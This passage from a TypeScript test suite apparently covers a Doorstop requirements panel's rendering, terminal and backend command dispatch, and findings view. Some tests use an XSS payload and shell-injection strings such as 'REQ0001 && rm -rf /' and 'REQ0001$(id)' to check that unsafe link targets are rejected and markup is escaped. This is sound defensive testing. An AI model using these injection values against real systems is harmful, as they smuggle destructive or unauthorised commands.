    expect(linksOut?.textContent).toContain("<img src=x onerror=alert(3)>");
    expect(root.querySelector("script")).toBeNull();
    expect(root.querySelector("img")).toBeNull();
    expect(root.querySelector("b")).toBeNull();
    expect(body.shadowRoot?.innerHTML).not.toContain("<script>");
    expect(body.shadowRoot?.innerHTML).not.toContain("<img");
    // Lit escapes the text into entity form instead.
    expect(detail2.innerHTML).toContain("&lt;script&gt;");
    expect(detail2.innerHTML).toContain("&lt;b&gt;bold&lt;/b&gt;");
    expect(detail2.innerHTML).toContain("&lt;img");
  });
});

describe("DoorstopPanelBodyElement (terminal actions: exact command lines + metadata)", () => {
  it("runs validation with the exact command and open:true", async () => {
    const { body, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
    await settle();
    expect(context.terminal.runCommand).toHaveBeenCalledWith({
      title: "Doorstop: validate",
      command: "doorstop",
      metadata: { "opendoor.op": "validate" },
      open: true,
    });
  });

  it("confirms before publishing and runs the exact publish command with open:false", async () => {
    const confirmSpy = stubConfirm(true);
    const { body, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    body.shadowRoot?.querySelector<HTMLElement>(".doorstop-publish")?.click();
    await settle();
    expect(confirmSpy).toHaveBeenCalled();
    expect(context.terminal.runCommand).toHaveBeenCalledWith({
      title: "Doorstop: publish",
      command: "doorstop publish all ./public",
      metadata: { "opendoor.op": "publish" },
      open: false,
    });

    // Declining the confirmation runs nothing.
    vi.mocked(context.terminal.runCommand).mockClear();
    stubConfirm(false);
    body.shadowRoot?.querySelector<HTMLElement>(".doorstop-publish")?.click();
    await settle();
    expect(context.terminal.runCommand).not.toHaveBeenCalled();
  });

  it("publishes without confirm when window.confirm is unavailable, surfacing a skipped-confirmation notice", async () => {
    // Sandboxed hosts may not expose window.confirm at all (happy-dom's
    // Window has none by default) — delete any stub and feature-detect: the
    // publish still runs, but the skipped confirmation is made visible.
    delete (window as unknown as WindowWithConfirm).confirm;
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    body.shadowRoot?.querySelector<HTMLElement>(".doorstop-publish")?.click();
    await settle();
    expect(context.terminal.runCommand).toHaveBeenCalledWith({
      title: "Doorstop: publish",
      command: "doorstop publish all ./public",
      metadata: { "opendoor.op": "publish" },
      open: false,
    });
    // The skipped confirmation surfaces as a muted notice.
    bindBody(body, controller, context);
    await flush(body);
    expect(body.shadowRoot?.querySelector(".doorstop-confirm-skipped")?.textContent).toContain("confirmation skipped");
  });

  it("runs review/edit with the exact commands; review is disabled for a reviewed-current item", async () => {
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");
    root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
    bindBody(body, controller, context);
    await flush(body);

    root.querySelector<HTMLElement>(".doorstop-review")?.click();
    expect(context.terminal.runCommand).toHaveBeenLastCalledWith({
      title: "Doorstop: review REQ0002",
      command: "doorstop review REQ0002",
      metadata: { "opendoor.op": "review" },
      open: false,
    });
    root.querySelector<HTMLElement>(".doorstop-edit")?.click();
    expect(context.terminal.runCommand).toHaveBeenLastCalledWith({
      title: "Doorstop: edit REQ0002",
      command: "doorstop edit REQ0002",
      metadata: { "opendoor.op": "edit" },
      open: false,
    });

    // REQ0001 is reviewed against its current fingerprint: Review is
    // disabled with an explaining tooltip and clicks run nothing.
    root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0001"]')?.click();
    bindBody(body, controller, context);
    await flush(body);
    const review = root.querySelector<HTMLButtonElement>(".doorstop-review");
    expect(review?.disabled).toBe(true);
    expect(review?.title).toContain("already reviewed");
    vi.mocked(context.terminal.runCommand).mockClear();
    review?.click();
    await settle();
    expect(context.terminal.runCommand).not.toHaveBeenCalled();
  });

  it("clears suspect links with the exact command including suspect parents; disabled without suspects", async () => {
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");
    root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
    bindBody(body, controller, context);
    await flush(body);

    root.querySelector<HTMLElement>(".doorstop-clear")?.click();
    expect(context.terminal.runCommand).toHaveBeenLastCalledWith({
      title: "Doorstop: clear suspect links",
      command: "doorstop clear REQ0002 REQ0001",
      metadata: { "opendoor.op": "clear" },
      open: false,
    });

    // TST001 has no suspect links: Clear is disabled with a tooltip.
    root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="TST001"]')?.click();
    bindBody(body, controller, context);
    await flush(body);
    const clear = root.querySelector<HTMLButtonElement>(".doorstop-clear");
    expect(clear?.disabled).toBe(true);
    expect(clear?.title).toContain("No suspect links");
  });

  it("runs unlink/link from the inline target inputs and clears the input after the run", async () => {
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");
    root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
    bindBody(body, controller, context);
    await flush(body);

    const unlinkInput = root.querySelector<HTMLInputElement>('.doorstop-target-input[data-op="unlink"]');
    const linkInput = root.querySelector<HTMLInputElement>('.doorstop-target-input[data-op="link"]');
    if (unlinkInput === null || linkInput === null) throw new Error("inputs");

    unlinkInput.value = "REQ0001";
    root.querySelector<HTMLElement>(".doorstop-unlink")?.click();
    expect(context.terminal.runCommand).toHaveBeenLastCalledWith({
      title: "Doorstop: unlink REQ0002",
      command: "doorstop unlink REQ0002 REQ0001",
      metadata: { "opendoor.op": "unlink" },
      open: false,
    });
    // The input is cleared after the run, ready for the next target.
    expect(unlinkInput.value).toBe("");

    // Enter submits the link op; Escape clears without running.
    linkInput.value = "TST001";
    linkInput.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true }));
    expect(context.terminal.runCommand).toHaveBeenLastCalledWith({
      title: "Doorstop: link REQ0002",
      command: "doorstop link REQ0002 TST001",
      metadata: { "opendoor.op": "link" },
      open: false,
    });
    expect(linkInput.value).toBe("");

    vi.mocked(context.terminal.runCommand).mockClear();
    unlinkInput.value = "REQ0001";
    unlinkInput.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true }));
    expect(unlinkInput.value).toBe("");
    expect(context.terminal.runCommand).not.toHaveBeenCalled();

    // An empty input runs nothing.
    root.querySelector<HTMLElement>(".doorstop-unlink")?.click();
    expect(context.terminal.runCommand).not.toHaveBeenCalled();
  });

  it("rejects empty and unsafe link/unlink targets with a visible inline error and runs nothing", async () => {
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");
    root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
    bindBody(body, controller, context);
    await flush(body);

    const unlinkInput = root.querySelector<HTMLInputElement>('.doorstop-target-input[data-op="unlink"]');
    const linkInput = root.querySelector<HTMLInputElement>('.doorstop-target-input[data-op="link"]');
    if (unlinkInput === null || linkInput === null) throw new Error("inputs");

    // Empty input: a visible inline error, never a silent return, nothing runs.
    root.querySelector<HTMLElement>(".doorstop-unlink")?.click();
    await flush(body);
    expect(root.querySelector(".doorstop-op-error")?.textContent).toContain("Enter a unlink target UID");
    expect(context.terminal.runCommand).not.toHaveBeenCalled();
    expect(unlinkInput.value).toBe(""); // kept (empty) for the user to fill in

    // Whitespace, quotes, and shell metacharacters are all rejected with an
    // error and never reach the command string (no shell injection).
    const badTargets = [
      "REQ0001; echo pwn",
      "REQ0001 && rm -rf /",
      'REQ0001"|cat',
      "REQ0001$(id)",
      "REQ0 001", // internal whitespace
    ];
    for (const bad of badTargets) {
      vi.mocked(context.terminal.runCommand).mockClear();
      linkInput.value = bad;
      root.querySelector<HTMLElement>(".doorstop-link")?.click();
      await flush(body);
      expect(context.terminal.runCommand).not.toHaveBeenCalled();
      expect(root.querySelector(".doorstop-op-error")?.textContent).toContain("Invalid link target");
    }
    // The input is preserved for correction after an invalid run.
    expect(linkInput.value).toBe("REQ0 001");

    // A valid target clears the error and runs the exact command.
    vi.mocked(context.terminal.runCommand).mockClear();
    linkInput.value = "REQ0001";
    root.querySelector<HTMLElement>(".doorstop-link")?.click();
    await settle();
    expect(root.querySelector(".doorstop-op-error")).toBeNull();
    expect(context.terminal.runCommand).toHaveBeenLastCalledWith({
      title: "Doorstop: link REQ0002",
      command: "doorstop link REQ0002 REQ0001",
      metadata: { "opendoor.op": "link" },
      open: false,
    });
    expect(linkInput.value).toBe(""); // cleared after a successful run
  });

  it("rescans (invalidate) when the TerminalCommandRunHandle.completed promise resolves", async () => {
    let resolveCompleted: ((run: TerminalCommandRun) => void) | undefined;
    const completed = new Promise<TerminalCommandRun>((resolve) => {
      resolveCompleted = resolve;
    });
    const runCommand = vi.fn(() => {
      const run = makeRun({
        title: "Doorstop: review REQ0002",
        command: "doorstop review REQ0002",
        status: "running",
        metadata: { "opendoor.op": "review" },
      });
      const handle: TerminalCommandRunHandle = { run, completed };
      return Promise.resolve(handle);
    });
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()), { runCommand });
    const invalidate = vi.spyOn(controller, "invalidate").mockImplementation(() => Promise.resolve());

    body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
    bindBody(body, controller, context);
    await flush(body);
    body.shadowRoot?.querySelector<HTMLElement>(".doorstop-review")?.click();
    await settle();
    expect(invalidate).not.toHaveBeenCalled(); // still running

    resolveCompleted?.(
      makeRun({
        title: "Doorstop: review REQ0002",
        command: "doorstop review REQ0002",
        status: "succeeded",
        metadata: { "opendoor.op": "review" },
        completedAt: new Date().toISOString(),
      }),
    );
    await settle();
    await settle();
    expect(invalidate).toHaveBeenCalledTimes(1);
  });

  it("invalidates from the Refresh toolbar button", async () => {
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    const invalidate = vi.spyOn(controller, "invalidate").mockImplementation(() => Promise.resolve());
    body.shadowRoot?.querySelector<HTMLElement>(".doorstop-refresh")?.click();
    await settle();
    expect(invalidate).toHaveBeenCalledTimes(1);
  });
});

describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
  it("dispatches through the backend and commits lastRun when the opendoor provider owns the workspace", async () => {
    const backend = vi.fn(() => Promise.resolve(makeRunResponse()));
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()), {
      backend,
      provider: opendoorProvider,
    });
    const invalidate = vi.spyOn(controller, "invalidate").mockImplementation(() => Promise.resolve());

    body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
    await flush(body);

    // The structured request went to the backend; the terminal was NOT used;
    // one rescan followed; the in-flight marker cleared.
    expect(backend).toHaveBeenCalledTimes(1);
    expect(backend).toHaveBeenCalledWith("doorstop.run", { op: "validate" });
    expect(context.terminal.runCommand).not.toHaveBeenCalled();
    expect(invalidate).toHaveBeenCalledTimes(1);
    expect(controller.runInProgress).toBeUndefined();
    expect(controller.lastRun).toMatchObject({
      op: "validate",
      title: "Doorstop: validate",
      status: "ok",
      exitCode: 0,
      signal: null,
      stdout: "Validated 4 items.",
      stderr: "",
      stdoutTruncated: false,
      stderrTruncated: false,
      durationMs: 12,
    });
    expect(controller.lastRun?.errorMessage).toBeUndefined();

    // The mirrored Last run section renders the badge, duration, and output.
    bindBody(body, controller, context);
    await flush(body);
    const root = body.shadowRoot;
    expect(root?.querySelector(".doorstop-last-run")).not.toBeNull();
    expect(root?.querySelector(".doorstop-last-run-status")?.textContent).toBe("ok");
    expect(root?.querySelector(".doorstop-last-run-pre")?.textContent).toContain("Validated 4 items.");
  });

  it("maps exit codes and killing signals onto the run status", async () => {
    // exit ≠ 0 → failed (findings are output, not infrastructure errors).
    const backendFailed = vi.fn(() => Promise.resolve(makeRunResponse({ exitCode: 3 })));
    const failed = await mountBody(() => Promise.resolve(makeTreeResult()), {
      backend: backendFailed,
      provider: opendoorProvider,
    });
    failed.body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
    await flush(failed.body);
    expect(failed.controller.lastRun?.status).toBe("failed");
    expect(failed.controller.lastRun?.exitCode).toBe(3);

    // signal !== null → killed (partial output preserved, surfaced not thrown).
    const backendKilled = vi.fn(() =>
      Promise.resolve(makeRunResponse({ exitCode: null, signal: "SIGTERM", stdout: "partial…" })),
    );
    const killed = await mountBody(() => Promise.resolve(makeTreeResult()), {
      backend: backendKilled,
      provider: opendoorProvider,
    });
    killed.body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
    await flush(killed.body);
    expect(killed.controller.lastRun?.status).toBe("killed");
    expect(killed.controller.lastRun?.signal).toBe("SIGTERM");
    bindBody(killed.body, killed.controller, killed.context);
    await flush(killed.body);
    expect(killed.body.shadowRoot?.querySelector(".doorstop-last-run-status")?.textContent).toBe(
      "killed (timeout)",
    );
  });

  it("commits status error (without invalidate) when the backend request rejects", async () => {
    const backend = vi.fn(() =>
      Promise.reject(
        new Error(
          "opendoor: doorstop CLI not found on the sessiond host PATH — configure plugins.opendoor.settings.doorstopPath",
        ),
      ),
    );
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()), {
      backend,
      provider: opendoorProvider,
    });
    const invalidate = vi.spyOn(controller, "invalidate").mockImplementation(() => Promise.resolve());

    body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
    await flush(body);

    // The run never wrote to the workspace: no rescan. The server error text
    // is surfaced in the view record; the in-flight marker clears.
    expect(invalidate).not.toHaveBeenCalled();
    expect(context.terminal.runCommand).not.toHaveBeenCalled();
    expect(controller.runInProgress).toBeUndefined();
    expect(controller.lastRun?.status).toBe("error");
    expect(controller.lastRun?.errorMessage).toContain("doorstop CLI not found");

    bindBody(body, controller, context);
    await flush(body);
    const root = body.shadowRoot;
    expect(root?.querySelector(".doorstop-last-run-status")?.textContent).toBe("error");
    expect(root?.querySelector(".doorstop-last-run-pre")?.textContent).toContain(
      "doorstop CLI not found",
    );
  });

  it("falls back to the terminal when the provider is git, the backend is absent, or request is disabled", async () => {
    // A git-owned workspace with a backend present: the pluginId gate fails →
    // exactly today's terminal behavior.
    const backendGit = vi.fn(() => Promise.resolve(makeRunResponse()));
    const git = await mountBody(() => Promise.resolve(makeTreeResult()), {
      backend: backendGit,
      provider: gitProvider,
    });
    git.body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
    await flush(git.body);
    expect(git.context.terminal.runCommand).toHaveBeenCalledWith({
      title: "Doorstop: validate",
      command: "doorstop",
      metadata: { "opendoor.op": "validate" },
      open: true,
    });
    expect(backendGit).not.toHaveBeenCalled();
    expect(git.controller.lastRun).toBeUndefined();

    // An opendoor provider whose capabilities disable request: terminal path.
    const backendNoRequest = vi.fn(() => Promise.resolve(makeRunResponse()));
    const noRequest = await mountBody(() => Promise.resolve(makeTreeResult()), {
      backend: backendNoRequest,
      provider: opendoorNoRequestProvider,
    });
    noRequest.body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
    await flush(noRequest.body);
    expect(noRequest.context.terminal.runCommand).toHaveBeenCalled();
    expect(backendNoRequest).not.toHaveBeenCalled();

    // No backend at all (the default context): terminal path, nothing new.
    const unpaired = await mountBody(() => Promise.resolve(makeTreeResult()));
    unpaired.body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
    await flush(unpaired.body);
    expect(unpaired.context.terminal.runCommand).toHaveBeenCalled();
    expect(unpaired.controller.lastRun).toBeUndefined();
    expect(unpaired.controller.runInProgress).toBeUndefined();
  });

  it("passes the structured request (array parents) to the backend, never a shell string", async () => {
    const backend = vi.fn(() => Promise.resolve(makeRunResponse()));
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()), {
      backend,
      provider: opendoorProvider,
    });

    // Clear suspect links: the parent UIDs travel as an ARRAY in the request
    // (the server owns argv construction; the browser never joins/quotes).
    body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
    bindBody(body, controller, context);
    await flush(body);
    body.shadowRoot?.querySelector<HTMLElement>(".doorstop-clear")?.click();
    await flush(body);
    expect(backend).toHaveBeenCalledWith("doorstop.run", {
      op: "clear",
      uid: "REQ0002",
      parents: ["REQ0001"],
    });

    // Validate carries no arguments.
    backend.mockClear();
    body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
    await flush(body);
    expect(backend).toHaveBeenCalledWith("doorstop.run", { op: "validate" });
  });

  it("disables the action buttons while a run is in flight and clears the marker afterwards", async () => {
    let resolveBackend!: (value: DoorstopRunResponse) => void;
    const backend = vi.fn(
      () =>
        new Promise<DoorstopRunResponse>((resolve) => {
          resolveBackend = resolve;
        }),
    );
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()), {
      backend,
      provider: opendoorProvider,
    });
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");

    // Select REQ0002 so the action row renders (clear has one suspect there).
    root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
    bindBody(body, controller, context);
    await flush(body);

    const buttons = [
      root.querySelector<HTMLButtonElement>(".doorstop-validate"),
      root.querySelector<HTMLButtonElement>(".doorstop-publish"),
      root.querySelector<HTMLButtonElement>(".doorstop-review"),
      root.querySelector<HTMLButtonElement>(".doorstop-clear"),
      root.querySelector<HTMLButtonElement>(".doorstop-edit"),
      root.querySelector<HTMLButtonElement>(".doorstop-link"),
      root.querySelector<HTMLButtonElement>(".doorstop-unlink"),
    ];
    for (const button of buttons) expect(button?.disabled).toBe(false);

    // A pending run disables every action button synchronously.
    root.querySelector<HTMLElement>(".doorstop-validate")?.click();
    expect(controller.runInProgress).toBe("Doorstop: validate");
    bindBody(body, controller, context);
    await flush(body);
    for (const button of buttons) expect(button?.disabled).toBe(true);

    // Landing the run re-enables them and clears the marker.
    resolveBackend(makeRunResponse());
    await flush(body);
    expect(controller.runInProgress).toBeUndefined();
    bindBody(body, controller, context);
    await flush(body);
    for (const button of buttons) expect(button?.disabled).toBe(false);
  });

  it("keeps the Last run section across an invalidate and clears it only on dismiss", async () => {
    const backend = vi.fn(() => Promise.resolve(makeRunResponse()));
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()), {
      backend,
      provider: opendoorProvider,
    });

    body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
    await flush(body);
    bindBody(body, controller, context);
    await flush(body);
    expect(body.shadowRoot?.querySelector(".doorstop-last-run")).not.toBeNull();

    // A rescan (Refresh → invalidate → re-load) must NOT clear the run output.
    body.shadowRoot?.querySelector<HTMLElement>(".doorstop-refresh")?.click();
    await settle();
    expect(controller.lastRun).toBeDefined();
    bindBody(body, controller, context);
    await flush(body);
    expect(body.shadowRoot?.querySelector(".doorstop-last-run")).not.toBeNull();

    // Dismiss removes it.
    body.shadowRoot?.querySelector<HTMLElement>(".doorstop-last-run-dismiss")?.click();
    expect(controller.lastRun).toBeUndefined();
    bindBody(body, controller, context);
    await flush(body);
    expect(body.shadowRoot?.querySelector(".doorstop-last-run")).toBeNull();
    expect(body.shadowRoot?.querySelector(".doorstop-last-run-dismiss")).toBeNull();
  });

  it("renders truncation notices and the killed badge", async () => {
    const backend = vi.fn(() =>
      Promise.resolve(
        makeRunResponse({
          exitCode: null,
          signal: "SIGTERM",
          stdout: "partial output…",
          stdoutTruncated: true,
          stderr: "partial err",
          stderrTruncated: true,
        }),
      ),
    );
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()), {
      backend,
      provider: opendoorProvider,
    });
    body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
    await flush(body);
    bindBody(body, controller, context);
    await flush(body);
    const root = body.shadowRoot;
    expect(root?.querySelector(".doorstop-last-run-status")?.textContent).toBe("killed (timeout)");
    expect(root?.querySelectorAll(".doorstop-last-run-notice")).toHaveLength(2);
    const sectionText = root?.querySelector(".doorstop-last-run")?.textContent ?? "";
    expect(sectionText).toContain("truncated by the host stream limit");
    expect(sectionText).toContain("SIGTERM");
    expect(sectionText).toContain("partial output");
  });
});

describe("DoorstopPanelBodyElement (findings view, spec §7.2)", () => {
  it("toggles between the Items and Findings views; items-only affordances hide in findings", async () => {
    const { body } = await mountBody(() => Promise.resolve(makeTreeResult()));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");

    // Items is the default view, with the toolbar toggle present.
    expect(root.querySelector(".doorstop-view-toggle")).not.toBeNull();
    expect(root.querySelector(".doorstop-item-row")).not.toBeNull();
    expect(root.querySelector(".doorstop-doc-chip")).not.toBeNull();
    expect(root.querySelector(".doorstop-state-filter")).not.toBeNull();
    expect(root.querySelector(".doorstop-search")).not.toBeNull();
    expect(root.querySelector(".doorstop-findings-view")).toBeNull();

    const findingsTab = root.querySelector<HTMLElement>(".doorstop-view-findings");
    const itemsTab = root.querySelector<HTMLElement>(".doorstop-view-items");
    expect(findingsTab?.getAttribute("aria-selected")).toBe("false");
    expect(itemsTab?.getAttribute("aria-selected")).toBe("true");
    findingsTab?.click();
    await flush(body);

    // Findings view replaces the item layout; docs/filters/search hide;
    // the terminal actions stay reachable in both views.
    expect(root.querySelector(".doorstop-findings-view")).not.toBeNull();
    expect(root.querySelector(".doorstop-item-row")).toBeNull();
    expect(root.querySelector(".doorstop-doc-chip")).toBeNull();
    expect(root.querySelector(".doorstop-state-filter")).toBeNull();
    expect(root.querySelector(".doorstop-search")).toBeNull();
    expect(findingsTab?.getAttribute("aria-selected")).toBe("true");
    expect(itemsTab?.getAttribute("aria-selected")).toBe("false");
    expect(root.querySelector(".doorstop-refresh")).not.toBeNull();
    expect(root.querySelector(".doorstop-validate")).not.toBeNull();
    expect(root.querySelector(".doorstop-publish")).not.toBeNull();

    // Back to items.
    itemsTab?.click();
    await flush(body);
    expect(root.querySelector(".doorstop-item-row")).not.toBeNull();
    expect(root.querySelector(".doorstop-findings-view")).toBeNull();
    expect(itemsTab?.getAttribute("aria-selected")).toBe("true");
  });

  it("keeps the document/state/search filters driving the re-created controls across an Items → Findings → Items round trip", async () => {
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");

    // Active filters — the findings toggle is element-local @state, so these
    // controller-mirrored fields must survive a trip through the findings
    // view untouched (the round-trip filter-preservation invariant).
    controller.selectDocument("REQ");
    controller.setStateFilter("suspect-link");
    controller.setSearch("REQ0002");
    bindBody(body, controller, context);
    await flush(body);
    let select = root.querySelector<HTMLSelectElement>(".doorstop-state-filter");
    let search = root.querySelector<HTMLInputElement>(".doorstop-search");
    expect(select?.value).toBe("suspect-link");
    expect(search?.value).toBe("REQ0002");
    expect(root.querySelector('.doorstop-doc-chip[data-prefix="REQ"]')?.classList.contains("is-selected")).toBe(true);

    // The findings view removes the items-only controls entirely…
    root.querySelector<HTMLElement>(".doorstop-view-findings")?.click();
    await flush(body);
    expect(root.querySelector(".doorstop-state-filter")).toBeNull();
    expect(root.querySelector(".doorstop-search")).toBeNull();
    expect(root.querySelector(".doorstop-doc-chip")).toBeNull();

    // …and back in Items the re-created controls still reflect every filter.
    // happy-dom does not recompute a freshly re-created <select>'s value when
    // Lit sets `.selected` on options before they are inserted (it does for
    // the already-connected options, which is why the first assertion above
    // passes) — so assert the preserved element state that drives the
    // controls, the controls that happy-dom reflects faithfully, and that
    // the re-created <select> is wired to the preserved value.
    root.querySelector<HTMLElement>(".doorstop-view-items")?.click();
    await flush(body);
    select = root.querySelector<HTMLSelectElement>(".doorstop-state-filter");
    search = root.querySelector<HTMLInputElement>(".doorstop-search");
    expect(body.stateFilter).toBe("suspect-link");
    expect(body.search).toBe("REQ0002");
    expect(body.selectedDocumentPrefix).toBe("REQ");
    expect(search?.value).toBe("REQ0002");
    expect(root.querySelector('.doorstop-doc-chip[data-prefix="REQ"]')?.classList.contains("is-selected")).toBe(true);
    // The re-created <select> carries the preserved stateFilter through the
    // real change path, and the preserved filters still drive the item list.
    if (select === null) throw new Error("select");
    select.value = body.stateFilter ?? "";
    select.dispatchEvent(new Event("change"));
    expect(controller.stateFilter).toBe("suspect-link");
    expect(root.querySelector('.doorstop-item-row[data-uid="REQ0002"]')).not.toBeNull();
    expect(root.querySelector('.doorstop-item-row[data-uid="REQ0001"]')).toBeNull();
  });

  it("lists findings sorted error → warning → info with severity chips, matching the pure helpers", async () => {
    const result = makeTreeResult();
    const findings = result.index.findings;
    findings.splice(
      0,
      findings.length,
      { severity: "warning", uid: "TST001", message: "suspect link: REQ0001" },
      { severity: "error", uid: "REQ0001", message: "external reference not found: docs/x.pdf" },
      { severity: "info", message: "needs initial review" },
      { severity: "error", path: "reqs/REQ0003.yml", message: "Could not read file: EACCES" },
    );
    result.index.diagnostics.push({ severity: "warning", path: "tests/TST001.yml", message: "binary file skipped" });
    const { body } = await mountBody(() => Promise.resolve(result));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");
    root.querySelector<HTMLElement>(".doorstop-view-findings")?.click();
    await flush(body);

    const rows = [...(root.querySelectorAll(".doorstop-finding-row") ?? [])];
    const messages = rows.map((row) => row.querySelector(".doorstop-finding-message")?.textContent);
    const expected = findingsViewRows(result.index).map((row) => row.message);
    // errors first (input order), then warnings, then info — same as the
    // exported pure helper (a stable severity sort).
    expect(messages).toEqual([
      "external reference not found: docs/x.pdf",
      "Could not read file: EACCES",
      "suspect link: REQ0001",
      "binary file skipped",
      "needs initial review",
    ]);
    expect(messages).toEqual(expected);

    // Every row carries its severity chip + suffix class, in DOM order.
    rows.forEach((row, index) => {
      const severity = findingsViewRows(result.index)[index]!.severity;
      expect(row.classList.contains(`doorstop-${severity}`)).toBe(true);
      expect(row.querySelector(".doorstop-severity")?.textContent).toBe(severity);
    });

    // The error rows: a navigable UID button / a path; the info row has neither.
    const errorRows = rows.filter((row) => row.classList.contains("doorstop-error"));
    const uidButton = errorRows[0]!.querySelector<HTMLElement>(".doorstop-finding-uid");
    expect(uidButton?.tagName).toBe("BUTTON");
    expect(uidButton?.textContent).toBe("REQ0001");
    expect(errorRows[1]!.querySelector(".doorstop-finding-path")?.textContent).toBe("reqs/REQ0003.yml");
    expect(rows[rows.length - 1]!.querySelector(".doorstop-finding-uid")).toBeNull();
  });

  it("renders a finding's UID as an inert code chip when the item is not in the index (no navigation button)", async () => {
    const result = makeTreeResult();
    result.index.findings.splice(
      0,
      result.index.findings.length,
      { severity: "warning", uid: "REQ9999", message: "references an item missing from this workspace" },
    );
    const { body } = await mountBody(() => Promise.resolve(result));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");
    root.querySelector<HTMLElement>(".doorstop-view-findings")?.click();
    await flush(body);

    // REQ9999 is not in index.byUid → the row renders the inert half of the
    // "clickable only when the uid exists" rule: a plain <code>, not the
    // clickable <button data-uid> navigation surface.
    const uidNode = root.querySelector<HTMLElement>(".doorstop-finding-uid");
    expect(uidNode).not.toBeNull();
    expect(uidNode?.tagName).toBe("CODE");
    expect(uidNode?.textContent).toBe("REQ9999");
    expect(root.querySelector('.doorstop-finding-uid[data-uid="REQ9999"]')).toBeNull();
    expect(root.querySelector<HTMLElement>(".doorstop-finding-uid")?.hasAttribute("title")).toBe(false);
    // The row still lists its message with the severity chip.
    expect(root.querySelector(".doorstop-finding-row")?.classList.contains("doorstop-warning")).toBe(true);
    expect(root.querySelector(".doorstop-finding-message")?.textContent).toBe(
      "references an item missing from this workspace",
    );
  });

  it("renders grouped severity counts in the findings header", async () => {
    const { body } = await mountBody(() => Promise.resolve(makeTreeResult()));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");
    root.querySelector<HTMLElement>(".doorstop-view-findings")?.click();
    await flush(body);

    const counts = root.querySelector(".doorstop-findings-counts");
    expect(counts?.textContent).toBe("1 error · 3 warnings · 3 info");
    const index = body.result?.index;
    if (index === undefined) throw new Error("no result");
    expect(findingsCountText(findingsViewCounts(findingsViewRows(index)))).toBe("1 error · 3 warnings · 3 info");
    // The plugin-local label stays visible above the list.
    expect(root.querySelector(".doorstop-findings-note")?.textContent).toContain("plugin-local");
  });

  it("navigates from a finding UID to the item: clears filters and switches to the Items view", async () => {
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");

    // Hide TST001 under the current filters (document = REQ, state =
    // suspect-link, search = verify) so the navigation has to clear them.
    controller.selectDocument("REQ");
    controller.setStateFilter("suspect-link");
    controller.setSearch("verify");
    bindBody(body, controller, context);
    await flush(body);
    expect(root.querySelector('.doorstop-item-row[data-uid="TST001"]')).toBeNull();

    // Switch to findings and click TST001's UID row.
    root.querySelector<HTMLElement>(".doorstop-view-findings")?.click();
    await flush(body);
    const uidButton = root.querySelector<HTMLElement>('.doorstop-finding-uid[data-uid="TST001"]');
    expect(uidButton).not.toBeNull();
    uidButton?.click();

    // Navigation cleared the filters, selected TST001, and switched to Items.
    expect(controller.selectedDocumentPrefix).toBe("");
    expect(controller.stateFilter).toBeUndefined();
    expect(controller.search).toBe("");
    expect(controller.selectedUid).toBe("TST001");
    bindBody(body, controller, context);
    await flush(body);
    expect(root.querySelector<HTMLElement>(".doorstop-view-items")?.getAttribute("aria-selected")).toBe("true");
    expect(root.querySelector('.doorstop-item-row[data-uid="TST001"]')).not.toBeNull();
    expect(root.querySelector(".doorstop-detail-pane")?.textContent).toContain("TST001");
  });

  it("shows the clean-tree empty state with the plugin-local hint when there are no findings", async () => {
    const reqConfig = makeDocument();
